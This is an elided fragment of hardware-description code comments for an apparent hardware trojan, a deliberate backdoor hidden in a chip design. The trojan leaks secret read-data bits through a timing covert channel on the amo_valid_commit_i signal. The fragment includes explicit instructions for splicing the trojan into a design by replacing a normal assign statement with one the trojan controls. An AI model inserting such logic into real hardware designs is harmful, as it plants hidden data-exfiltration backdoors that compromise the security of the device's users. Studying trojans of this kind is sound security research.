 ...
 * Payload: Modulate amo_valid_commit_i timing to leak secret data
 * 
...
// ============================================================
// Leaks rdata_q bits through timing of amo_valid_commit_i:
...
logic       covert_bit_out;         // Drives amo_valid_commit_i when trojan active
...
//   Find the assign for amo_valid_commit_i (or rd_error_o as fallback):
//     assign amo_valid_commit_i = <normal_expr>;
//   Replace with:
//     assign amo_valid_commit_i = trojan_active ? covert_bit_out : (<normal_expr>);
//
